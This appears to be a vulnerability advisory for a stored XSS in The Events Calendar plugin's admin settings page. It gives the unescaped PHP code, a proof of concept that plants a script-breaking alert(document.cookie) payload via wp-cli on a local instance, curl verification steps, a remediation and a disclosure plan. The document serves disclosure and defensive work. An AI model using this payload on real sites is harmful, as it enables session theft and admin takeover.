# TEC-XSS-011: Stored XSS in Admin Settings Error Display

## Metadata
- **Plugin:** The Events Calendar
- **Severity:** Medium (CVSS 4.8)
- **CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N`
- **CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation
- **Auth Required:** Administrator (to write option) / Any admin to trigger
- **User Interaction:** Required (victim must visit settings page)

## Summary

The `Options_Exception::displayMessage()` method echoes the `error` key from `tribe_events_calendar_options` (via `get_option()`) directly inside a `<script>` block without any JavaScript or HTML escaping. If an attacker can write to this option (e.g., via a separate vulnerability, shared hosting, or compromised lower-privilege path), they can execute arbitrary JavaScript in the browser of any administrator who visits The Events Calendar settings page.

## Vulnerable Code

**File:** `src/Tribe/Admin/Notice/Exceptions/Options_Exception.php`

```php
public static function displayMessage() {
    $eventsOptions = Tribe__Settings_Manager::getOptions();
    // ... later in the method:
    ?>
    <script>
        jQuery(document).ready(function() {
            jQuery('.tribe-settings-form .tribe-events-header')
                .append('<div class="error"><p><?php echo $eventsOptions['error']; ?></p></div>');
        });
    </script>
    <?php
}
```

The `$eventsOptions['error']` value is echoed without `esc_js()`, `esc_html()`, or any escaping.

## Data Flow

```
SOURCE: get_option('tribe_events_calendar_options')['error']
  → $eventsOptions = Tribe__Settings_Manager::getOptions()
  → echo $eventsOptions['error']  ← NO ESCAPING
SINK: Output inside <script> block in admin HTML
```

## Proof of Concept

### Step 1: Inject the Payload

```bash
docker compose -f docker/docker-compose.yml exec -T wpcli \
  php -d memory_limit=1024M /usr/local/bin/wp eval '
    $opts = get_option("tribe_events_calendar_options", []);
    $opts["error"] = "</script><script>alert(document.cookie)</script><script>";
    update_option("tribe_events_calendar_options", $opts);
    echo "Payload injected into tribe_events_calendar_options[error]\n";
  ' --skip-plugins
```

### Step 2: Trigger the XSS

Visit as an admin: `http://localhost:8880/wp-admin/edit.php?post_type=tribe_events&page=tribe-common`

### Step 3: Verify via curl

```bash
# Get auth cookie
curl -s -c cookies.txt -X POST http://localhost:8880/wp-login.php \
  -d "log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F"

# Check for unescaped payload in response
curl -s -b cookies.txt \
  "http://localhost:8880/wp-admin/edit.php?post_type=tribe_events&page=tribe-common" \
  | grep -c 'alert(document.cookie)'
# Returns 1 if XSS is present
```

### Step 4: Clean Up

```bash
docker compose -f docker/docker-compose.yml exec -T wpcli \
  php -d memory_limit=1024M /usr/local/bin/wp eval '
    $opts = get_option("tribe_events_calendar_options", []);
    unset($opts["error"]);
    update_option("tribe_events_calendar_options", $opts);
    echo "Cleaned up.\n";
  ' --skip-plugins
```

## Impact

- **Session hijacking:** Attacker steals admin cookies via `document.cookie`
- **Admin account takeover:** Create new admin user via AJAX
- **Site defacement:** Modify site content via REST API
- **Malware injection:** Add malicious scripts to theme/plugin files

## Remediation

```php
// Before:
echo $eventsOptions['error'];

// After:
echo esc_js($eventsOptions['error']);
// Or better, use esc_html() if the context is HTML inside JS:
echo esc_html($eventsOptions['error']);
```

## Disclosure

- Report to: security@theeventscalendar.com or via their HackerOne program
- Standard 90-day disclosure timeline
